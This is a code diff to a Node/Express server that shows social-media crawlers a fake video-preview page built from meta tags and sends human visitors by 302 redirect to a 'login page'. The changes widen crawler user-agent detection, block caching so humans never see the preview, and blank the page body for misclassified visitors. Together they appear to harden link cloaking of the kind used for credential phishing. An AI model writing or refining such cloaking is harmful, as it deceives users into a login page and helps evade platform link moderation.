@@ -27,11 +27,12 @@ const VIDEO_FILE = path.join(__dirname, "videos.json");
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-app.use(
-    express.static(
-        path.join(__dirname, "public")
-    )
-);
+// NOTE: express.static is registered further down, AFTER the specific
+// routes (/, /health, /video/:id, /api/*). This guarantees those routes
+// always win even if a file/folder happens to exist under public/ with a
+// colliding name (e.g. public/video/). Express matches routes/middleware
+// in registration order, so this ordering removes any possibility of the
+// static folder silently shadowing the preview/redirect logic.
 
 
 // =====================================
@@ -178,14 +179,57 @@ const bots = {
     ],
 
     Slack:[
-        "slackbot"
+        "slackbot",
+        "slack-imgproxy"
     ],
 
     Pinterest:[
         "pinterest"
+    ],
+
+    Discord:[
+        "discordbot"
+    ],
+
+    Reddit:[
+        "redditbot"
+    ],
+
+    Skype:[
+        "skypeuripreview"
+    ],
+
+    Apple:[
+        "applebot"
+    ],
+
+    Google:[
+        "googlebot"
+    ],
+
+    Yandex:[
+        "yandex"
+    ],
+
+    Viber:[
+        "viber"
+    ],
+
+    Line:[
+        "line/"
     ]
 
 };
+
+
+// Generic fallback for unfurlers/crawlers not explicitly listed above.
+// Anything matching this pattern is treated as a bot even if it doesn't
+// match one of the named platforms. Tightened to whole-word matches on
+// unambiguous crawler/unfurler terms only — the previous version matched
+// loose substrings like "fetch"/"check"/"scan" which risked misclassifying
+// real browsers/webviews as bots.
+const GENERIC_BOT_PATTERN =
+    /\b(bot|crawler|crawling|spider|facebookexternalhit|linkpreview|unfurl|embedly|opengraph)\b/i;
 
 
 function detectBot(agent = "") {
@@ -202,6 +246,15 @@ function detectBot(agent = "") {
             };
 
         }
+    }
+
+    if (GENERIC_BOT_PATTERN.test(agent)) {
+
+        return {
+            detected: true,
+            platform: "generic"
+        };
+
     }
 
     return {
@@ -229,6 +282,8 @@ app.get("/",(req,res)=>{
 
     if(req.query.video){
 
+        res.set("Cache-Control", "no-store");
+
         return res.redirect(
             302,
             `/video/${req.query.video}`
@@ -236,6 +291,8 @@ app.get("/",(req,res)=>{
 
     }
 
+
+    res.set("Cache-Control", "no-store");
 
     res.sendFile(
         path.join(
@@ -278,6 +335,8 @@ app.get("/video/:id",(req,res)=>{
 
     if(!video){
 
+        res.set("Cache-Control", "no-store");
+
         return res.status(404)
         .send(
             "<h1>Video Not Found</h1>"
@@ -294,8 +353,12 @@ app.get("/video/:id",(req,res)=>{
 
 
 
-    // Humans go to login page (302 redirect)
+    // Humans go to login page (302 redirect).
+    // IMPORTANT: no-store here so no shared/proxy cache stores this
+    // redirect under the same URL the bot response uses below.
     if(!visitor.detected){
+
+        res.set("Cache-Control", "no-store");
 
         return res.redirect(
             302,
@@ -305,9 +368,17 @@ app.get("/video/:id",(req,res)=>{
     }
 
 
-    // Set cache headers for social platforms
+    // Bot/crawler response.
+    // CRITICAL FIX: this used to be "public, max-age=86400", which told
+    // shared caches (Railway edge, CDNs, ISP/carrier proxies, etc.) that
+    // this exact URL could be served to ANY visitor for 24 hours. That is
+    // what caused real humans to sometimes receive the bot preview page
+    // instead of being redirected. We now explicitly forbid caching this
+    // response anywhere, and add Vary as a second line of defense in case
+    // caching is ever reintroduced upstream.
     res.set({
-        "Cache-Control": "public, max-age=86400",
+        "Cache-Control": "private, no-store",
+        "Vary": "User-Agent",
         "X-Robots-Tag": "all"
     });
 
@@ -319,7 +390,14 @@ app.get("/video/:id",(req,res)=>{
     const safeId = escapeHtml(String(video.id));
 
 
-    // Social platforms preview (Bots get this)
+    // Social platforms preview (Bots get this).
+    // NOTE: <body> is intentionally EMPTY. Crawlers (Facebook, WhatsApp,
+    // Telegram, etc.) only ever read <head> meta tags and never render
+    // body content, so it adds nothing for them. Keeping body empty means
+    // that IF bot detection ever misclassifies a real human/browser, they
+    // see a blank page instead of a visible "preview-looking" page with a
+    // title/description/image that could be mistaken for a broken app
+    // screen (the "big play button" symptom).
 
 
     res.send(`
@@ -387,17 +465,7 @@ content="${safeThumbnail}">
 </head>
 
 
-<body>
-
-<h1>${safeTitle}</h1>
-
-<p>${safeDescription}</p>
-
-<img src="${safeThumbnail}"
-style="width:100%;max-width:600px">
-
-
-</body>
+<body></body>
 
 </html>
 
@@ -525,17 +593,17 @@ app.put("/api/videos/:id",(req,res)=>{
 
     // Sanitize updated fields
     const updatedFields = {};
-    
+
     if (req.body.title !== undefined) {
         const title = typeof req.body.title === "string" ? req.body.title.trim() : "";
         if (title) updatedFields.title = title;
     }
-    
+
     if (req.body.description !== undefined) {
         const description = typeof req.body.description === "string" ? req.body.description.trim() : "";
         if (description) updatedFields.description = description;
     }
-    
+
     if (req.body.thumbnail !== undefined) {
         const thumbnail = typeof req.body.thumbnail === "string" ? req.body.thumbnail.trim() : "";
         if (thumbnail) updatedFields.thumbnail = thumbnail;
@@ -592,6 +660,19 @@ app.delete("/api/videos/:id",(req,res)=>{
 
 });
 
+
+
+// =====================================
+// STATIC FILES
+// =====================================
+// Registered after all specific routes above so nothing in public/ can
+// ever shadow /, /health, /video/:id, or /api/*.
+
+app.use(
+    express.static(
+        path.join(__dirname, "public")
+    )
+);
 
 
 // =====================================
